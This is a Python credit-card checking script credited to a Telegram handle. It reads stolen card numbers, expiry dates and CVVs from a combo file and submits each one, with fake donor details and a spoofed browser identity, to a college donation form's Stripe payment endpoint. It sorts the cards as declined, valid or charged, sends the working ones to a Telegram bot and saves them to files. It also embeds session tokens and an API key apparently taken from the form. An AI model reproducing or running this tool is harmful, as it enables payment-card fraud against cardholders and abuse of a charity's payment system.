import os
import time
import requests
from user_agent import generate_user_agent

# Terminal Colors
D = '\033[2;32m'
E = '\033[2;33m'
R = '\033[2;31m'
B = '\033[2;36m'
Lb = '\033[1;33m'
W = '\033[1;37m'
X = '\033[1;33m'
F = '\033[2;32m'
C = "\033[1;97m"

L = '- - - - - - - - - -Tool By : @INDgurnoorsingh - - - - - - - - - - - -\n'
print(F + L)

# Load configuration from Render Environment Variables
tokeen = os.getenv('TELEGRAM_TOKEN')
tid = os.getenv('TELEGRAM_ID')
combo_file = os.getenv('COMBO_FILE', 'combo.txt')

if not tokeen or not tid:
    print(R + "[!] Error: TELEGRAM_TOKEN and TELEGRAM_ID environment variables must be set in Render dashboard!")
    exit(1)

print(Lb + f"Using Combo File: {combo_file}")
print(E + '- - - - - - - - - -Enjoy my friend  - - - - - - - - - - - -\n')

sbt = 0

def chk(crd): 
    global sbt
    crd = crd.strip()
    if not crd or '|' not in crd:
        return
    try:
        cn, mm, yy, cvv = crd.split('|', 3)
    except ValueError:
        return
        
    user = generate_user_agent()
    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'en-AU,en;q=0.9,ar-EG;q=0.8,ar;q=0.7,en-GB;q=0.6,en-US;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundarylrxtO8wYB0rCO2sV',
        'Origin': 'https://formstack.io',
        'Referer': 'https://formstack.io/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': user,
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    }
    
    files = [
        ('inputdate', (None, '11/3/2024 4:21:19')),
        ('userTimeZone', (None, '300')),
        ('txtHtmlId', (None, '2hbx1Fv8p-niFCJlWMSc5A')),
        ('txtSendSizeChange', (None, '')),
        ('txtObjId', (None, '')),
        ('txtOrgId', (None, 'St_LAnKxoEYM11rYjHBghR4LC0uJo-4KW5ABUsHvA54')),
        ('txtAuthToken', (None, '')),
        ('txtRefreshToken', (None, 'K0zpx8wxB38TXNrQVoMdHfRdIOC0XaH9ODN3-WwCDJG3qGlg2fZR8n4aFTRv1rENKoxcPKPuZUMiiW44yDjfo6YlzFFtKqw7BORu6686PmCPuIcpr8qYuYM4nD8KrkCn')),
        ('txtAccessURI', (None, '')),
        ('txtSessionID', (None, '7NCNQJHy9zzdPPN4Au831Mc7MO7cmTs2UzRJNvb1RKetD-H6B8uVZfauMca4LULJ')),
        ('txtSubmittedData', (None, '')),
        ('formHtml', (None, '')),
        ('multipageEnabled', (None, 'False')),
        ('breadcrumbEnabled', (None, 'False')),
        ('breadcrumbNumbered', (None, 'False')),
        ('breadcrumbPrefix', (None, '')),
        ('submitMessage', (None, 'Thank you for your submission!')),
        ('submitUrl', (None, '')),
        ('submitBtnText', (None, 'Submit ')),
        ('prevBtnText', (None, 'Back')),
        ('nextBtnText', (None, 'Next')),
        ('pageValType', (None, 'form')),
        ('txtUserContentId', (None, '')),
        ('hasCustomCSS', (None, 'True')),
        ('isCurrentForm', (None, 'False')),
        ('packageTier', (None, '')),
        ('isDraft', (None, 'False')),
        ('saveForLaterEnabled', (None, 'False')),
        ('saveBtnText', (None, 'Save')),
        ('discardBtnText', (None, 'Discard')),
        ('draftSaved', (None, '')),
        ('draftEmail', (None, '')),
        ('paymentType', (None, 'Stripe')),
        ('formName', (None, 'Donation Management Form')),
        ('formId', (None, '')),
        ('CommunityInstanceURL', (None, '')),
        ('CommunitySessioID', (None, '')),
        ('CommunityUserId', (None, '')),
        ('CommunityUserType', (None, '')),
        ('CommunityViewMode', (None, '')),
        ('comPrefillDataset', (None, '')),
        ('prefillDataset', (None, '')),
        ('comPrefillObj', (None, '')),
        ('hfFileServiceEndpoint', (None, 'https://sfapi.formstack.io')),
        ('hfFileServiceApiKey', (None, '8fc5982e-6eca-4d73-a3ff-997902b163b0-20212151122')),
        ('reCaptchaV3token', (None, '')),
        ('submissionWorkflowId', (None, '')),
        ('isPopulateHTMLFromBackEnd', (None, 'True')),
        ('hfIsNativePaymentOn', (None, 'False')),
        ('hfDefaultNativeSiteURL', (None, '')),
        ('hfPackageNamespace', (None, 'VisualAntidote__')),
        ('submitRules', (None, '')),
        ('FSGFRadioButton356', (None, 'Company%20Donation')),
        ('Contact.npsp__Primary_Affiliation__c.Name', (None, 'New%20yorm')),
        ('Contact.FirstName', (None, 'williams')),
        ('Contact.LastName', (None, 'hiro')),
        ('Contact.Email', (None, 'aa0799414021%40gmail.com')),
        ('Contact.HomePhone', (None, '5124578451')),
        ('Contact.npsp__Primary_Affiliation__c.Phone', (None, '5124578451')),
        ('Contact.Alumni__c', (None, 'No')),
        ('Contact.Program_Level__c', (None, '')),
        ('Contact.Completion_Date__c', (None, '')),
        ('FSGFRadioButton522', (None, '')),
        ('Contact.CVCC_Employment_Status__c', (None, '')),
        ('Contact.CVCC_Employment_Type__c', (None, '')),
        ('Contact.Employee_ID__c', (None, '')),
        ('FSGFRadioButton346', (None, 'One-Time%20Donation')),
        ('FSGFDropdown701', (None, 'The%20School%20of%20Community%20Development%20and%20Public%20Services%20Education%20%28CDPSE%29')),
        ('Contact.Opportunity.A.Amount', (None, '1')),
        ('FSGFDropdown1000', (None, '')),
        ('Contact.npe03__Recurring_Donation__c.B.npe03__Installment_Period__c', (None, '')),
        ('FSGFRadioButton464', (None, '')),
        ('FSGFRadioButton131', (None, '')),
        ('FSGFCheckbox915', (None, '')),
        ('Contact.npe03__Recurring_Donation__c.B.Contact_Me_Regarding_Donation__c', (None, '')),
        ('FSGFRadioButton436', (None, 'No')),
        ('Contact.Opportunity.A.Preferred_Name_on_Donaiton__c', (None, 'Williams')),
        ('Contact.npe03__Recurring_Donation__c.B.Preferred_Name_on_Donaiton__c', (None, '')),
        ('FSGFCheckbox557', (None, '')),
        ('Contact.Opportunity.A.Additional_Info_Regarding_Gift__c', (None, '')),
        ('Contact.Opportunity.A.In_Honor_of__c', (None, '')),
        ('Contact.Opportunity.A.In_Memory_of__c', (None, '')),
        ('Contact.npe03__Recurring_Donation__c.B.Additional_Info_Regarding_Gift__c', (None, '')),
        ('Contact.npe03__Recurring_Donation__c.B.In_Honor_of__c', (None, '')),
        ('Contact.npe03__Recurring_Donation__c.B.In_Memory_of__c', (None, '')),
        ('Contact.Opportunity.A.Funding_Program__c', (None, 'a0u8V00000AT2h7QAD')),
        ('inputContact.Opportunity.A.Funding_Program__c', (None, 'The%20School%20of%20Community%20Development%20%26%20Public%20Services%20Education%20%28CDPSE%29%202022-23')),
        ('inputContact.Opportunity.A.Funding_Program__c', (None, 'The%20School%20of%20Community%20Development%20%26%20Public%20Services%20Education%20%28CDPSE%29%202022-23')),
        ('Contact.Opportunity.A.CloseDate', (None, '11%2F03%2F2024')),
        ('Contact.Opportunity.A.Name', (None, 'New%20yorm%20External%20Donation%2011%2F03%2F2024')),
        ('Contact.Opportunity.A.RecordTypeId', (None, '0128V000001iNcAQAU')),
        ('inputContact.Opportunity.A.RecordTypeId', (None, 'Donation')),
        ('inputContact.Opportunity.A.RecordTypeId', (None, 'Donation')),
        ('Contact.Opportunity.A.CampaignId', (None, '7018V000000sLgrQAE')),
        ('inputContact.Opportunity.A.CampaignId', (None, 'Online%20Donations')),
        ('inputContact.Opportunity.A.CampaignId', (None, 'Online%20Donations')),
        ('Contact.Opportunity.A.Method_of_Payment__c', (None, 'Credit%20Card')),
        ('Contact.Opportunity.A.StageName', (None, 'Closed%20Won')),
        ('Contact.Opportunity.A.Type_of_donation_company_individual__c', (None, 'Company%20Donation')),
        ('Contact.Opportunity.A.Remain_Anonymous__c', (None, 'No')),
        ('Contact.npe03__Recurring_Donation__c.B.Funding_Program__c', (None, '')),
        ('inputContact.npe03__Recurring_Donation__c.B.Funding_Program__c', (None, '')),
        ('inputContact.npe03__Recurring_Donation__c.B.Funding_Program__c', (None, '')),
        ('Contact.npe03__Recurring_Donation__c.B.npe03__Amount__c', (None, '')),
        ('Contact.npe03__Recurring_Donation__c.B.Name', (None, '')),
        ('Contact.npe03__Recurring_Donation__c.B.npsp__StartDate__c', (None, '')),
        ('Contact.npe03__Recurring_Donation__c.B.npe03__Recurring_Donation_Campaign__c', (None, '')),
        ('inputContact.npe03__Recurring_Donation__c.B.npe03__Recurring_Donation_Campaign__c', (None, '')),
        ('inputContact.npe03__Recurring_Donation__c.B.npe03__Recurring_Donation_Campaign__c', (None, '')),
        ('Contact.npe03__Recurring_Donation__c.B.npsp__RecurringType__c', (None, '')),
        ('Contact.npe03__Recurring_Donation__c.B.npsp__Day_of_Month__c', (None, '')),
        ('Contact.npe03__Recurring_Donation__c.B.npsp__Date_Established__c', (None, '')),
        ('Contact.npe03__Recurring_Donation__c.B.Type_of_donation_company_individual_Rec__c', (None, '')),
        ('Contact.npe03__Recurring_Donation__c.B.Donor_wishes_to_remain_anonymous__c', (None, '')),
        ('Contact.npe03__Recurring_Donation__c.B.npsp__PaymentMethod__c', (None, '')),
        ('FSGFRadioButton831', (None, 'Yes')),
        ('Contact.Opportunity.A.Deduct_From_Payroll__c', (None, '')),
        ('Contact.npe03__Recurring_Donation__c.B.Deduct_From_Payroll__c', (None, '')),
        ('FSGFShortAnswer6', (None, 'william%20Hiro')),
        ('FSGFShortAnswer776', (None, 'Hiro%20Hiroo')),
        ('Contact.npe01__AlternateEmail__c', (None, 'aa0799414021%40gmail.com')),
        ('Contact.AccountId.BillingStreet', (None, '123%20williams%20street%0Azh')),
        ('Contact.AccountId.BillingCity', (None, 'NY')),
        ('Contact.AccountId.BillingState', (None, 'New%20York')),
        ('Contact.AccountId.BillingPostalCode', (None, '10080')),
        ('Contact.AccountId.BillingCountry', (None, 'United%20States')),
        ('FFCreditCard14', (None, cn)),
        ('FFCVV14', (None, cvv)),
        ('FFExpiryMM14', (None, mm)),
        ('FFExpiryYYYY14', (None, yy)),
        ('FFCreditCard146', (None, '')),
        ('FFCVV146', (None, '')),
        ('FFExpiryMM146', (None, '')),
        ('FFExpiryYYYY146', (None, '')),
        ('FFCreditCard713', (None, '')),
        ('FFCVV713', (None, '')),
        ('FFExpiryMM713', (None, '')),
        ('FFExpiryYYYY713', (None, '')),
        ('Contact.AccountId.Name', (None, 'hiro%20Household')),
        ('Contact.AccountId.RecordTypeId', (None, '0128V000001iNc8QAE')),
        ('inputContact.AccountId.RecordTypeId', (None, 'Household%20Account')),
        ('inputContact.AccountId.RecordTypeId', (None, 'Household%20Account')),
        ('Contact.npsp__Primary_Affiliation__c.RecordTypeId', (None, '0128V000001iNc9QAE')),
        ('inputContact.npsp__Primary_Affiliation__c.RecordTypeId', (None, 'Organization')),
        ('inputContact.npsp__Primary_Affiliation__c.RecordTypeId', (None, 'Organization')),
        ('FSGFShortAnswer240', (None, '11%2F03%2F2024')),
        ('Contact.Opportunity.A.Description', (None, '')),
        ('Contact.Opportunity.A.Payment_Plan_ID__c', (None, '')),
        ('Contact.npe03__Recurring_Donation__c.B.Payment_Plan_ID__c', (None, '')),
        ('FSGFShortAnswer446', (None, 'williams_hiro_Monthly_Donation')),
        ('FSGFShortAnswer929', (None, 'williams_hiro_Annual_Donation')),
        ('selectedId', (None, '')),
        ('ReturnUrl', (None, 'https://formstack.io/D5036')),
    ]
    
    try:
        response = requests.post('https://sfapi.formstack.io/FormEngine/EngineFrame/CheckPayment', headers=headers, files=files)
    except Exception as e:
        print(R + f"Request failed: {e}")
        return

    binn = cn[:6]
    sbt += 1
    try:
        bin_data = requests.get(f'https://binchk-api.vercel.app/bin={binn}').json()
        brand = bin_data.get('brand', '*')
        type = bin_data.get('type', '*')
        bank = bin_data.get('bank', '*')
        cnt = bin_data.get('country', '*')
        emj = bin_data.get('flag', '*')
    except:
        brand, type, bank, cnt, emj = ['*' for x in range(5)]
        
    if 'declined' in response.text or 'card number is incorrect.' in response.text or 'Sorry, we do not accept this' in response.text or 'expiration' in response.text:
        print(X + f'[ {sbt} ] - ' + R + f'{cn}|{mm}|{yy}|{cvv} -> Declined ❌')
        
    elif 'security code is incorrect.' in response.text:
        print(X + f'[ {sbt} ] - ' + F + f'{cn}|{mm}|{yy}|{cvv} -> CCN ✅')
        requests.get(f'''https://api.telegram.org/bot{tokeen}/sendMessage?chat_id={tid}&text=CCN ✅
━━━━━━━━━━━━━━━━           
[↯] CC ⇾ {cn}|{mm}|{yy}|{cvv}
[↯] GATES: STRIPE CHARGE 1$
[↯] RESPONSE: security code is incorrect. 🟢
━━━━━━━━━━━━━━━━━
[↯] BIN: {binn} - {brand} - {type} 
[↯] ISSUER: {bank}
[↯] COUNTRY: {cnt} {emj}
[↯] TIME: 3s
━━━━━━━━━━━━━━━━━
[↯] Bot By ⇾ @INDgurnoorsingh''')
        with open('visa_CCN.txt', 'a') as f_out:
            f_out.write(f'{cn}|{mm}|{yy}|{cvv}\n')
        
    elif 'Your card could not be' in response.text:
        print(X + f'[ {sbt} ] - ' + F + f'{cn}|{mm}|{yy}|{cvv} -> Live ✅')
        requests.get(f'''https://api.telegram.org/bot{tokeen}/sendMessage?chat_id={tid}&text=Approved ✅
━━━━━━━━━━━━━━━━           
[↯] CC ⇾ {cn}|{mm}|{yy}|{cvv}
[↯] GATES: STRIPE CHARGE 1$
[↯] RESPONSE: Your card cannot be prepaid. 🟢
━━━━━━━━━━━━━━━━━
[↯] BIN: {binn} - {brand} - {type} 
[↯] ISSUER: {bank}
[↯] COUNTRY: {cnt} {emj}
[↯] TIME: 3s
━━━━━━━━━━━━━━━━━
[↯] Bot By ⇾ @XMANSPEAKS''')
        with open('visa_Live.txt', 'a') as f_out:
            f_out.write(f'{cn}|{mm}|{yy}|{cvv}\n')
        
    else:
        print(X + f'[ {sbt} ] - ' + F + f'{cn}|{mm}|{yy}|{cvv} -> CHARGE ✅')
        requests.get(f'''https://api.telegram.org/bot{tokeen}/sendMessage?chat_id={tid}&text=CHARGE ✅
━━━━━━━━━━━━━━━━           
[↯] CC ⇾ {cn}|{mm}|{yy}|{cvv}
[↯] GATES: STRIPE CHARGE 1$
[↯] RESPONSE: Thank you for your order. 🟢
━━━━━━━━━━━━━━━━━
[↯] BIN: {binn} - {brand} - {type} 
[↯] ISSUER: {bank}
[↯] COUNTRY: {cnt} {emj}
[↯] TIME: 3s
━━━━━━━━━━━━━━━━━
[↯] Bot By ⇾ @INDgurnoorsingh''')
        with open('visa_Charge_1$.txt', 'a') as f_out:
            f_out.write(f'{cn}|{mm}|{yy}|{cvv}\n')

if os.path.exists(combo_file):
    with open(combo_file, 'r') as f_in:
        for crd in f_in.readlines():
            chk(crd)
            time.sleep(3)
else:
    print(R + f"[!] Combo file '{combo_file}' not found in the project directory. Please upload your combo file to GitHub.")
  
